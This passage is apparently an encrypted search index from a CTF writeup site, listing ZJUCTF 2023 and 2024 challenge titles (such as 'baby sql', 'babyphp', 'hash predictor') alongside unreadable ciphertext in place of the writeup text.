2023"},{"location":"writeups/zjuctf2023/#zjuctf-2023-writeup","text":"Xsr315EEs7THIxZwk88fnA==;DUKE8IAeNOtT6n8jB7F37Hcrarj3DhW5ixYbUZl0wREfTamtIZxeb2c7V+xy7kjJDjAlesvCMYaTahcyUA0/VZYJkVNqPj6EMMdaJenMQZ4883AJD4uhmoTopinpSdqfoQP57nSSqF/9r4IxnrAeFLJjGYAUVGg0mspHhzZ3Im9JJImFojrXjTnpbAk3SGoeET3vq4MOD3/fqIIdqHqcpWO9ZG/PUPkGb58coSDX50EW9ab4S/kbf2EfiWbjw43Bviukox+GfiaxvskArrdun2IDs+xyH3aCUYMaNJJ4mFNC/JtANklap+uz80NUmS+qw8EV+v/RBjC+H0B31WhKTWCZ7m+LROyJvm7LdXIwsvcnxXxSNv9xUOggl+64o+kladhvYuYF7IwqCtSgY4gjP5WZb2RjStPRQk5WfLFxThTj0HihKLN407c1Xbxaq+494omnvSbdMdMsOc1V6m+9VNOnm9LteqtKlSx7k14EDgf2wpyNaztAYGuJOPiTe/84Q0s/oedqRsbtSqq0rFty47NTJuMN8l9EEY+/x5ucfGuarqOtKjYlEcv4jxaf9oaZHs2J8VfBn+0Mqi2aTzzMqaLiHZ7SgVKkCK8sHKBFjfoaHRIB8aiwwFobI1IjUcqu76s1PiQxszAcXqnY8VtzCQqiumYoufMDK14vAmAQFovrvBGwG9YEWjIPywUY4zCtO/7hlXOvruzaa+raHMXqpWh1PG4gjmWoe3krwYqMshaK+Mv8Us3SFMFYA89DbjYRI2zypDkVTGMlEdqQ3gPeW+oAq6FrPtiDj/pPNBYJMN6WmnmAIZmd4CUX6O1zcMSa+dvm5kEDbPZygMm/lfmtlkmzF5mvjrvauJIE6TPrrq+/NB8WczF2YsI1xx8ak3t4L/fnHxVw1DLcVyor2ao/7cOq3gPprDE0qBo+8W/0LQBP/8l46CyS6aDIE6vO4yB3zlrBDUIjcXintokfg6mbeKFJis0/Vcqn8BYtnTXKELLzloy5DIQUYbyTn8UNPcsmldiqEETdCOTqX1tzKZ9PxbINcfyY3XvCvH95sA3/qyjpKXeTObhvLx5n7IcwKOnsSP/Pf/egsB/GOARw+CkrDQYOip2sWor6GRUAB1SnVb5h1OQ9AUJU3kqhb1e9dyva6TPu9Kmcj45dIBeVWf0vtANkqAoybz0HGeT7PJh4yrzhCOkPPUze+nfD/Q0vssbnGRmv/AqE78aontBj1CbNE2akn1kI1zklAxg6dVinH3d07FML9fI/m8B7wE/BHoRq;^","title":"ZJUCTF 2023 Writeup"},{"location":"writeups/zjuctf2023/#_2","text":"Rq3zTz8+K8ZImCODmc2DNw==;r8wccPkkr/qsP4uGNY9ZYIroj5IB2GgD2QmwiVT+0FCWb8fswRveXyxGnXMztxAlPsMWCq3grTLfIwxw9obuvUk1DMn5IsPzDj5Bcd6Exj4pLtUZZvCa2hJuc+WdPyxbvCyltIksa1U2nW1fRvbKKXmTNYaDmgrL1tfsfUfSgts=;^","title":"\u666e\u901a\u7684\u9b54\u6cd5\u53f2"},{"location":"writeups/zjuctf2023/#23w40a_or_ctf","text":"3vT552WDVDUOhnA7WNAvjw==;K2mD03CRp++0QBUJ8rKQYtiS8Vn08mSF4l2jLjKIicL7fqItY+9yVRO9GvD+uBnksEgCwPWKbV61bTKhiEm75J2RyT6Q1T6EY6+q2CRzR8VyRHTDPlBu4Pvtn02PkQqxdnlzDi65upo/j5Of8DfpAK0cz2NH2ahMbnRtZyT8qKs6+EuukMu2HuYPp973Qzzgbm1ELOOcE93R+OUPUC43bGyp7etyprxTGdHEKyf0sdlrIORJdO8zDE3rOjdw0eItYM9dRnMbXCdjx+cbZHTDvzWrFYrMRH0xNW+LYZwuiKl8gXhTAYCE6TDkhOpu42Y8WDIEqGljmn8Dz/uvk/43KcIuTkfSyfo5X3/4/CrQjebl4Z9+hoR+Z/aq4OjnqbrQtdN4Pmyjng8qteiL7/mcOg7PW18Jd9IGXfZc5bwM4xLZjQ9RCp4GC476asDDtxAZ4leEY7C7Ff02AueBJMxrDnwyZ9DVXHaWfQkj31yv1BDq8mmH2D+SmKPrucxvOiAw0m3VXFNWJOrd9CV8WYlfjwTy+aDfq3QFwVIpicjFbHs=;^","title":"23w40a_or_ctf"},{"location":"writeups/zjuctf2023/#ruru","text":"ywHU3MnyTg2QrtvFCpKJTg==;cnEi1nZtIdIh2vxdxeva4ieserk3dqN7mdMVY2QMqNqdN+vlLXE/HmzM5ju9F9ujnH8XCNtCv1l4oVxQmw8t6+X4/U6rkxYoITfL5/xYu8cGtm9RsCGAVdWP384aDLEtOpZ/BWpimBtQoNGUyj9xeC708YKq29iP/yG+Koq/IgMgVVKim0itE5z3EyKizKuniK+phJipjzjhBdPAH6YmYsnFH5rTJ21WN5hicnp2rgBYcyUvtHFHmLZWyP+wCict8alz65H+ExtpRxHwBHiaFQMn+AkAU/bnztbjp1X7LHJhSHbwz68BA4Sb00uNPJNGzpbqdnysgFGT8A1H9s3h86nixuylvrOv/lCJkW9UkWmEQX9jKtb8yJTbiZJTMemKjQhkhbG0b4N/ctuIi6Rze8OlIWZG0iNhmnG70htU3M0=;^","title":"RURU"},{"location":"writeups/zjuctf2023/#genshin-impact-format","text":"ZnaWTGiFLFnXWSj/szSPMA==;K++3bcOFXT+Lg3aMGNSDrKIOnqp9uQPjsp4VkcP6Fw2JmDAt/Oc3J41/J49hpQYh2pWkQsYSZwUrEZ3gXJ77Obg2deBTQ2IsHM4qVnkXrnk7Kiqt0iUWaYF9MuEUPL2K7wHQXZ7hlxC/+IviWwEV/+LKf9i6SoKhncxFRbiDBcmkgwJiP4LweSWr7IPsjyon9atFOjDsMch3ot0NTza9cA==;^","title":"Genshin Impact Format"},{"location":"writeups/zjuctf2023/#proof-of-work","text":"qca5u+vza39GHEnFfVE3OQ==;BIHT4AXviWi+Ip4kg37HVF3pz1KN+NlRWEPUgXvb6I0=;^","title":"Proof-of-Work"},{"location":"writeups/zjuctf2023/#quine-relay","text":"m9Ml2Q3W67frnfzB4r1+Zw==;Dg4UHshIGxXIPwJjkOoit1SxdLZ9FT9PmdSI17fJ0T6bITdptQPuRZcPOSACfDz4gg2mlLbEnNx9mZq5Zfz7I7k7evLbiH2HbDjo5jL1P02AuUWcSFyD61YbmUMIIJNz;^","title":"Quine Relay"},{"location":"writeups/zjuctf2023/#minesweeper-master","text":"e0LGX+k7ZYqvoEjLQFr0Eg==;g3KmauuYQQXAP1C/5otOlsHyUnLaBRrc53Ai7zf1T3s=;^","title":"Minesweeper Master"},{"location":"writeups/zjuctf2023/#easy-reverse","text":"b/dvaekCiUe0TW0YSX2jLA==;QE6senPMcpDESdyGbNOpsEtFJMlXl+rH3hvhOlinorNE0CA0Uf2ptTM8ni1++OmhvOPQPeV6c7Mi7p1O7XujldyhTIT7VOpCddKTaH7Hj7omEaj9sJ3E9ISPcfmv6eX2zCZ7SGbzcBKfP1gQT1xaXjXvlxL1EqPmoJY8xVBI/Fw=;^","title":"easy reverse"},{"location":"writeups/zjuctf2023/#hash-predictor-1","text":"fkMYh76K3A5RC0NEy6tb0A==;ddZHlnefZ4O6XJkLZGoY+XiTmMEB9UYKV7Tkh0SNAnH4Oj68AQw9K5SST9fax2awFw+za3rBa0PCT3jOHqjSMJfEhnzqEjHGzLPnC7pVcHP1Nh9l6Nt/RKVPSE9kp7AczerOQ3R02jVJGYFhGMbZwohv7XkAGL07ObhaylxXCYsDi1Nnfp2vafm+nnMlTIte5bqjFUr/ZJuZmOJEtzfOOfovFjtuu3XrIYFouNTtZAAWpJiSses0wriZj7l7gDhU;^","title":"hash predictor 1"},{"location":"writeups/zjuctf2023/#hash-predictor-2","text":"Uwu582SnKReNe6JtOGdl+A==;7rLIe5Io1NI4m3KjLwEm6w0julyAC4kesIldVnsvRrmmCJ09YWjy2J0J6zBMIcGiKezQUVxoFV9wM1kr5aMzzKJkratHj4Rg07N8JpxsljGsq1OuOZJQzRKDI9O5FC93;^","title":"hash predictor 2"},{"location":"writeups/zjuctf2023/#welcome","text":"dpp2bpqSWhYhNMSJaNO2nw==;N0gHI+xKsAMygMDfz+wVuDSSmk7Dfd6UYk/hkGnIU3nvdmaNtNsMsUM1xycVwYYjaHPaB2rEZTMMrZRpNHCdSg==;^","title":"welcome"},{"location":"writeups/zjuctf2023/#baby-sql","text":"Y8eWSDv+bsgkT5xem5a6FA==;u5Ywkk67uTDrkv3bd3fks0kDPAbEzl/6x7ROMIVAupQJVYmxgh4z2kPmIc2gCILehFYvQtPcIde6HBpqu6wdeQ==;^","title":"baby sql"},{"location":"writeups/zjuctf2023/#easy-sql","text":"nOK9P+O5s0T0+UvBvBOrig==;7MFN0dkhWcHtrGhc/GKfudfb70JmgUoPJJV42tIT/c4sS5k0Nc533Gxslz0BzrmydJGa5C31Y09kfRvBWgy5oSY70UPVQ5Awy3TC1i5OF8U16Ccdc7dWPYrHX7rxibTd;^","title":"easy sql"},{"location":"writeups/zjuctf2023/#babyphp","text":"R6zbeZojcqsxzL403tn7nA==;ccKRRb/Rc3B+HUfL6vexohQIP0zu6UJ2JmUbRxgsSvs=;^","title":"babyphp"},{"location":"writeups/zjuctf2023/#easy-calc","text":"X57C6VhSvKTr76cDn+ak/Q==;EuUVJJhr4+n1m0wqgFFBsY+1X6BL6sJj6qO7OZn0tnsywqOFQnvoRfivMVVLT4JayPtb+4tx/dK9AFdVSwXuF7GjUYRobiefN/rPYjgYfU8is1iuf+P9r0fGtoEqMpYK;^","title":"easy calc"},{"location":"writeups/zjuctf2023/#babyfor-realjs","text":"t/DCMsZwvo+BziBnXdwwYQ==;+Pm277c3mfJi2KGkKul7CxtKP1A97SjGxqPgXy0E4Ss=;^","title":"Baby\uff08for real\uff09js"},{"location":"writeups/zjuctf2023/#rev-signin","text":"e333fSj5sgZdLU8CeW+neA==;DNt0+jkbubJA1RhsVNe461jtt43PnChbDedAYteq+aSUcy5OJ4n8Mrr/+ffZmYlFMPgmb2dXG3zwR4+LQxJ/+wDV8OmtwVwOYHxIqg4uLWiiq4S2Pd6d8Z1gVToQYrHO;^","title":"rev signin"},{"location":"writeups/zjuctf2023/#zju-dorm","text":"h0CtboalmpNrVIaXmIKcqg==;GUMm4dx+qcXmGFUpD9M5/wcOU8OzMNjj+joXUD9ydCVTrVRYL9vnhHPF2RH/4Z7wJvcIlc5Ygugn9q3z5tzymnyJpauL+tPrrtq55LULcMtjDNa00HyMYYVSJ25IonOR;^","title":"ZJU dorm"},{"location":"writeups/zjuctf2023/#if-else","text":"38F4BSXM+WcVThSS8P0q7g==;bCAvj3f3ImeTqIcrCd24uRKp0pZWh1KDkSWuZBtlEPA8guT91LkTfz8E3yfiKsN9Lhs8PMFJN9EbsWvqwU0yKXjfHpyswnex0E8vNm6nWOo2PvsSj6pTqBon2D4zPUhEyqSLfHyTdB9CLcz7HNiB2+sj23kcTeBeYjBVlS2At0k=;^","title":"IF ELSE"},{"location":"writeups/zjuctf2023/#500mazes","text":"gwWYsHGqjCD43tYRP1cTaA==;GisSukSV3c8mLGhpWJZNBEyInnmhMy8OpsX9V+18nqmL50nNoq/71NMmc0Ptpr5213t/oNMy4b99KZwcaIpuH2k6hknH8GrIqYj/HLkovYOytp5On55D0jsv48CCccYNdivwSWXKwHW+CN+7TZip5gW7PotZpvCQJe5JhF7lQjP7ejx6pLCEB6toYXdiOX5X0G1xqzdBsnAL0pB67yFnmNW9L+OHA0ZJ2tBxhpyYRu5ufBnd4RHC5d4TYxsXhCal;^","title":"500mazes"},{"location":"writeups/zjuctf2023/#_3","text":"nAs6JyAXSfKkksnBxmZM4w==;o3Lw9JKfg4+CNzcMOpWVuupOkXpBwd0JaZ9HhLN0/51cXP7CBP8e7LelcNspCas0vdsCc9/Y3/UYXwVQ3l8bi9flTkRGRGRy7nTOC/4BaKIZUjKRC7YX0KbKRNzZf3VRFhUPSzzV3lME5PrxwHDq5XN+5phTX/DfiCupSdvCK8vJ5qWRfwXTS+Tle9CMG0NrEn1oj7ZtB8AXshjkReKA5A==;^","title":"\u26a1 \u9065 \u9065 \u9886 \u5148 \u26a1"},{"location":"writeups/zjuctf2024/","text":"YVIMU6cTeLlsw9ieT5LlgQ==;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